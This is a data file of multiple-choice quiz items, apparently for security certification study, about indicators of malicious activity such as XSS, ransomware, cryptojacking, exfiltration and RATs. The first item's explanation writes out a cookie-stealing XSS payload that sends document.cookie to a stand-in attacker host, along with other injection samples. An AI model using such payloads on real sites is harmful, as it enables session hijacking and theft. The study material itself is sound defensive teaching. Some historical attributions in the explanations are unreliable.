# Domain 2.0 - Threats, Vulnerabilities, and Mitigations
# Subdomain 2.4 - Indicators of Malicious Activity
# Format: question|answer_a|answer_b|answer_c|answer_d|correct_idx|explanation|domain|subdomain

Web requests with <script> tags, JavaScript code, or HTML in form inputs indicate what?|Normal input|Cross-site scripting attack|SQL injection|CSRF|1|Web requests containing <script> tags, JavaScript code, or HTML markup in form inputs, URL parameters, or headers indicate Cross-Site Scripting (XSS) attacks. Attackers inject malicious scripts into web applications that other users' browsers execute, enabling: session cookie theft (document.cookie), credential harvesting via fake login forms, website defacement, browser exploitation, keylogging, redirecting users to malicious sites, and conducting phishing attacks within the legitimate website's context. XSS comes in three types: Reflected (script in URL parameter immediately returned), Stored (script saved in database, affects all users viewing it), and DOM-based (client-side JavaScript manipulation). Examples of malicious payloads include: <script>document.location='http://attacker.com/?c='+document.cookie</script> to steal cookies, <img src=x onerror="malicious_code"> for obfuscation, and <iframe src="malicious-site"> for clickjacking. The 2018 British Airways breach involved Magecart XSS stealing 380,000 payment cards. Web application firewalls detect XSS patterns in logs. Prevention requires: input validation rejecting special characters, output encoding (htmlspecialchars), Content Security Policy headers, HttpOnly cookie flags, and regular security testing.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Sudden increase in outbound SMTP traffic from a server that isn't a mail server indicates what?|Legitimate email|Spam botnet activity|Email backup|User error|1|Sudden increases in outbound SMTP (Simple Mail Transfer Protocol, port 25/587) traffic from servers that aren't designated mail servers strongly indicate spam botnet activity or malware spreading via email. Compromised systems are used to: send spam campaigns (millions of emails), distribute malware via email attachments, conduct phishing campaigns, and relay email to hide the true source. Using compromised systems rather than attacker infrastructure makes: emails appear from legitimate IP addresses, blocklists less effective, and attribution more difficult. The Emotet malware botnet sent millions of emails daily before its 2021 takedown. Indicators include: thousands of outbound SMTP connections, connections to residential or suspicious mail servers, messages with suspicious attachments or links, emails sent outside business hours, and sudden spikes in bandwidth usage. Organizations should: monitor all outbound SMTP traffic, block outbound SMTP except from authorized mail servers (egress filtering), implement SMTP authentication, check internal systems against spam blacklists, and investigate any system initiating outbound email traffic. Legitimate email should flow through centralized, monitored mail servers with proper SPF/DKIM/DMARC configuration. Compromised systems should be isolated and reimaged.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Files with double extensions like document.pdf.exe or image.jpg.scr indicate what?|Compressed file|Malware disguise technique|Backup file|System file|1|Files with double extensions like "document.pdf.exe," "invoice.docx.exe," or "photo.jpg.scr" are classic malware disguise techniques exploiting Windows' default behavior of hiding known file extensions. Users see "document.pdf" in Windows Explorer (the true .exe is hidden) and assume it's a legitimate PDF, but double-clicking executes the malware. This social engineering technique is used in: phishing email attachments, malicious downloads, USB drop attacks, and file-sharing sites. Common malicious extensions hidden by Windows include: .exe (executable), .scr (screensaver, actually executable), .com (command file), .bat (batch script), .vbs (VBScript), .pif (Program Information File), and .js (JavaScript). The 2017 Locky ransomware extensively used .js and .vbs double extensions. Additional indicators include: files with suspicious icons (executable with PDF icon), files in unusual locations (%TEMP%, Downloads), unsolicited attachments, and files from untrusted sources. Prevention requires: configuring Windows to show all file extensions (Folder Options), training users to recognize double extensions, blocking dangerous file types at email gateway, checking file signatures (magic bytes) not just extensions, and using antivirus with behavioral detection. Organizations should implement application control policies blocking execution from user-writable directories.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Unusual parent-child process relationships (e.g., Word.exe spawning PowerShell.exe) indicate what?|Normal operation|Process injection or macro execution|Software update|Printing document|1|Unusual parent-child process relationships, such as Microsoft Word spawning PowerShell, Excel launching cmd.exe, or svchost.exe creating unexpected child processes, are strong indicators of malicious activity through process injection, exploitation, or macro-based malware. Legitimate process hierarchies follow predictable patterns (e.g., explorer.exe spawning user applications), but malware disrupts these patterns by: executing malicious macros in Office documents, exploiting vulnerabilities to spawn unexpected processes, injecting code into legitimate processes, and creating reverse shells from compromised applications. The 2017 NotPetya ransomware used Office macros spawning PowerShell for initial infection. Common suspicious relationships include: Office applications → PowerShell/cmd.exe, browsers → wscript.exe, services → interactive applications, and system processes → user applications. Process monitoring tools like Sysmon (Event ID 1 for process creation, ID 10 for process access) and EDR solutions track parent-child relationships. Investigation involves: identifying the parent process initiating suspicious behavior, analyzing command-line arguments, checking process creation timestamps, reviewing loaded DLLs, and examining process memory. Organizations should: disable macros by default, implement application control policies, enable attack surface reduction rules, and use behavioral analytics to detect anomalous process trees.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Executables running from temporary directories (%TEMP%, %APPDATA%, C:\Users\*\Downloads) indicate what?|Software installation|Malware execution|User downloads|System update|1|Executables running from temporary directories like %TEMP%, %APPDATA%, %LOCALAPPDATA%, or Downloads folders are common indicators of malware execution. Legitimate software installs from temporary locations but typically moves to Program Files; malware prefers temporary directories because: users have write permissions (no admin rights needed), antivirus may trust user directories more, installation detection is reduced, cleanup is easier for attackers, and many users never check temporary folders. Ransomware, banking trojans, and remote access tools (RATs) frequently execute from: C:\Users\[username]\AppData\Local\Temp, C:\Users\[username]\AppData\Roaming, C:\Windows\Temp, and C:\Users\[username]\Downloads. The Emotet malware drops payloads in %APPDATA% with random names. Additional indicators include: executables with random names (random8char.exe, temp_12345.exe), unsigned or untrusted code signatures, processes making network connections, and executables created recently. Organizations should: implement application control policies blocking execution from user-writable directories (AppLocker, Windows Defender Application Control), monitor for suspicious process creation from these locations, educate users about running downloaded files, and use endpoint detection tools. Some legitimate software (portable apps) also runs from these locations, requiring context-based analysis.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Registry keys with names containing Unicode or special characters indicate what?|Internationalization|Evasion technique|Configuration setting|Language pack|1|Registry keys using Unicode characters, special symbols, null bytes, or zero-width characters are evasion techniques to hide malicious registry entries from administrators and security tools. Attackers use these techniques to: make keys invisible or unselectable in Registry Editor (regedit), evade search tools looking for known malicious key names, prevent easy deletion, confuse forensic analysts, and bypass registry monitoring solutions. Examples include: keys with trailing spaces, keys using Cyrillic or Chinese characters that look like English (homoglyph attacks), keys with embedded null bytes, keys using right-to-left override (RTLO) characters, and keys with zero-width characters. The 2016 "BadRabbit" ransomware used registry keys with special characters. These entries may be: completely invisible in regedit UI, appear as blank entries, cause errors when attempting access, or display incorrectly depending on system locale. Detection requires: using PowerShell or programmatic registry access (not just regedit GUI), checking for non-ASCII characters in key names, comparing binary registry dumps, and using specialized forensic tools. Organizations should implement: registry integrity monitoring, baseline comparisons, and regular audits. Legitimate internationalized applications may use Unicode, but in security contexts it's highly suspicious.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Port scans showing sequential connection attempts to many ports on a system indicate what?|Network diagnostics|Reconnaissance activity|Software updates|Backup operation|1|Port scans showing sequential or randomized connection attempts to many ports indicate reconnaissance activity, where attackers map available services, identify vulnerable applications, fingerprint operating systems, and find potential attack vectors. Port scanning is typically the first phase of a targeted attack after initial network access. Common scanning patterns include: SYN scans (half-open connections), full TCP connect scans, UDP scans, and stealth scans. Tools like Nmap, Masscan, and Zmap are used by both attackers and security professionals. Indicators of malicious scanning include: scans originating from internal systems (indicating compromise), scans targeting critical infrastructure, scans followed by exploitation attempts, scans from suspicious geographic locations, and scans outside change control windows. The 2017 WannaCry ransomware scanned for open SMB ports (445) before exploitation. Network-based IDS/IPS (Snort, Suricata) detect scanning patterns. Organizations should: monitor for scanning activity, investigate internal scan sources immediately, implement network segmentation to limit scan effectiveness, use host-based firewalls, disable unnecessary services, and correlate scans with other IOCs. Legitimate vulnerability scanning should be scheduled, documented, and originate from known security tools. Unexpected scanning requires immediate investigation.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

A cryptocurrency mining process consuming high CPU resources indicates what?|Authorized mining|Cryptojacking malware|Video rendering|Scientific computation|1|Unauthorized cryptocurrency mining processes (cryptojacking malware) consuming high CPU/GPU resources indicate system compromise for profit. Cryptominers turn infected systems into mining farms for cryptocurrencies like Monero (XMR), favored for: privacy features, CPU-mining profitability, and difficult attribution. Cryptojacking is extremely prevalent because it's: low-risk for attackers (users often don't notice), profitable with enough infected systems, persistent (runs continuously), and less confrontational than ransomware. Infamous examples include the Coinhive JavaScript miner (embedded in compromised websites) and the 2018 Jenkins server cryptomining campaigns. Indicators include: sustained high CPU usage (70-100%), systems running hot or fans constantly running, process names mimicking legitimate processes (svchost.exe, System, Windows Update), connections to mining pools, and performance degradation. Cryptominers may: use CPU throttling to avoid detection, operate only during off-hours, or activate based on user idle time. Detection involves: monitoring CPU usage anomalies, checking running processes, analyzing network connections to known mining pools, and using antivirus/EDR. Prevention requires: patching vulnerabilities used for initial compromise, blocking mining pool domains, implementing application control, and educating users about browser-based miners.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Multiple systems showing similar unusual behaviors simultaneously indicates what?|Scheduled updates|Worm propagation|Configuration management|User training|1|Multiple systems exhibiting similar unusual behaviors simultaneously (mass infections) strongly indicate worm propagation or coordinated malware campaigns exploiting shared vulnerabilities. Worms self-replicate across networks automatically without user interaction, spreading rapidly through: network shares (SMB), email, removable media, vulnerabilities (EternalBlue), and weak credentials. Famous worm outbreaks include: 2017 WannaCry (200,000+ systems in 150 countries in 4 days), 2003 Slammer worm (75,000 systems in 10 minutes), 2001 Code Red (359,000 systems), and 2004 Sasser worm. Simultaneous indicators across multiple systems include: same malware detected on many hosts, similar network traffic patterns, synchronized infection timestamps, identical registry modifications, and mass system crashes or reboots. This differs from targeted attacks progressing system-by-system via lateral movement. Response requires: immediate network segmentation to contain spread, identifying patient zero (first infected system), patching the exploited vulnerability across all systems, coordinated malware removal, and forensic analysis. Organizations should: monitor for mass anomalies, implement network segmentation limiting worm spread, maintain patch management, and have incident response plans for mass incidents. Automated configuration management (SCCM, Ansible) also causes simultaneous changes but is scheduled and documented.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Files being encrypted with .encrypted, .locked, or random extensions and ransom notes appearing indicate what?|Backup operation|Ransomware infection|File compression|Disk error|1|Files being renamed with extensions like .encrypted, .locked, .crypted, or random strings (e.g., .wncry, .locky) accompanied by ransom notes (README.txt, HOW_TO_DECRYPT.html) are unmistakable indicators of ransomware infection. Ransomware encrypts files using strong cryptography (AES, RSA) and demands payment (usually cryptocurrency like Bitcoin, Monero) for decryption keys. Modern ransomware variants include: WannaCry (2017, .wncry), Locky (.locky, .odin, .zepto), Ryuk (targeted, high ransom), REvil/Sodinokibi (ransomware-as-a-service), Maze (data exfiltration + encryption), and Conti. Double extortion tactics threaten to publish stolen data if ransom isn't paid. Ransomware impacts include: complete data loss if no backups, business disruption (downtime), reputational damage, regulatory fines (if personal data exposed), and ransom payments (often $100K+ for businesses). Immediate response: isolate affected systems from network, do NOT pay ransom (no guarantee of decryption, funds terrorists), disconnect mapped drives, disable local administrator accounts, identify ransomware variant (no-more-ransom.org may have free decryptors), restore from offline backups, and report to law enforcement. Prevention: offline/immutable backups, endpoint protection, email filtering, patch management, least privilege, and network segmentation.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Users reporting browser redirects to unexpected websites or search engines indicate what?|ISP hijacking|Browser hijacker malware|DNS configuration|Network issue|1|Browser redirects to unexpected websites or search engines (different from user's configured settings) indicate browser hijacker malware that modifies browser settings to: generate advertising revenue through forced traffic, track browsing habits for data theft, distribute additional malware, conduct phishing via fake search results, and redirect users to malicious websites. Browser hijackers typically modify: default search engine, homepage, new tab page, browser shortcuts (adding command-line parameters), DNS settings, proxy configurations, and install malicious browser extensions. Common hijackers include: Conduit Search, MyWebSearch, Ask Toolbar, and Babylon Toolbar. Infection vectors include: bundled software installations, fake software updates (especially Adobe Flash), malicious browser extensions, and drive-by downloads. Symptoms include: unexpected search redirects (Google searches redirect through hijacker), new toolbars appearing, homepage changed without permission, pop-ups and ads on sites that normally don't have them, and slow browser performance. Removal requires: uninstalling suspicious programs, resetting browser settings, removing malicious extensions, checking DNS and proxy settings, scanning with anti-malware tools, and checking browser shortcut properties for appended parameters. Prevention involves: downloading software from official sources only, reading installation prompts carefully, and keeping browsers updated.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

System performance degradation coinciding with new software installations indicates what?|Hardware failure|Potentially unwanted program|Normal behavior|Driver issue|1|System performance degradation (slowdowns, high resource usage, crashes) immediately following new software installations often indicates potentially unwanted programs (PUPs), bundled malware, or resource-intensive applications. PUPs are software with questionable behavior that users may not have knowingly agreed to install, including: adware, browser hijackers, system optimizers (often fake), search toolbars, and download managers. Performance impacts include: constant background processes, memory consumption, network bandwidth usage, disk activity, startup slowdowns, and browser performance degradation. Software bundling tricks users by: pre-checking optional software in installation wizards, using "Express" vs. "Custom" installation (Express installs everything), hiding bundled software in terms of service, and using confusing language ("Recommended" installations including unwanted software). The 2015 SourceForge bundling controversy and CNET Download.com installer wrappers are notorious examples. Users should: download software from official sources only, choose Custom installation, uncheck additional software offers, read all installation screens, and research unfamiliar software names before proceeding. Post-installation investigation: check recently installed programs (Control Panel, Programs and Features, sorted by Install Date), review startup programs (Task Manager, Startup tab), scan with anti-malware tools (Malwarebytes, AdwCleaner), and uninstall suspicious recent installations. Organizations should use application control policies preventing unauthorized software.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Network traffic analysis showing data transferred in chunks at regular intervals indicates what?|Video streaming|Data exfiltration|Software updates|Cloud backup|1|Network traffic showing data transferred in regular-sized chunks at consistent intervals indicates controlled data exfiltration, where attackers slowly extract stolen data to evade detection by: staying below bandwidth thresholds, avoiding traffic spikes that trigger alerts, blending with normal business traffic, and minimizing performance impact that users might notice. This technique is characteristic of advanced persistent threats (APTs) conducting long-term espionage rather than smash-and-grab attacks. Attackers may: schedule transfers during business hours (blend with legitimate traffic), use approved protocols and ports (HTTPS 443, DNS 53), compress and encrypt data before transfer, and implement bandwidth throttling. The 2014 Sony Pictures hack involved 100TB exfiltrated over weeks; the 2015 OPM breach exfiltrated 21.5 million records gradually. Detection requires: establishing network traffic baselines, monitoring for sustained connections to unusual destinations, identifying regular traffic patterns inconsistent with business needs, analyzing traffic content with DLP, and correlating with other IOCs. Network behavioral analytics and UEBA solutions can identify anomalous regular patterns. Organizations should: implement DLP solutions, monitor outbound traffic, use egress filtering, segment networks, and encrypt sensitive data at rest (making exfiltration harder). While legitimate cloud backups and updates also show regular patterns, they should be documented, scheduled, and to known destinations.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Webcam or microphone indicators activating without user action indicate what?|System check|Spyware or RAT|Driver update|Application testing|1|Webcam or microphone indicators (LED lights) activating without user action strongly indicate spyware, remote access trojans (RATs), or stalkerware monitoring victims without consent. These tools enable attackers to: capture audio/video for espionage or blackmail, monitor physical spaces, record conversations, steal sensitive information visible on camera, and conduct intimate partner surveillance. Notable RATs with audio/video capabilities include: BlackShades, DarkComet, Blackhole RAT, and njRAT. The 2013 Miss Teen USA webcam hacking case involved a RAT capturing photos over months. Commercial stalkerware like FlexiSpy, mSpy, and SpyFone are marketed for "parental control" but used for domestic surveillance abuse. Indicators include: webcam LED lighting unexpectedly, microphone in use indicator (Windows taskbar), unknown applications accessing camera/mic (Settings → Privacy), files created in webcam folders when camera shouldn't be active, and network traffic during supposed inactive periods. Some sophisticated malware can disable LED indicators entirely. Protection requires: covering webcams when not in use (physical privacy covers), reviewing application permissions regularly, monitoring active processes, keeping antivirus updated, and using network monitoring to detect unauthorized data uploads. Organizations should implement: DLP monitoring for unauthorized device access, endpoint detection for RATs, and security awareness training about physical privacy. Check camera/microphone permissions: Windows Settings → Privacy → Camera/Microphone.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity
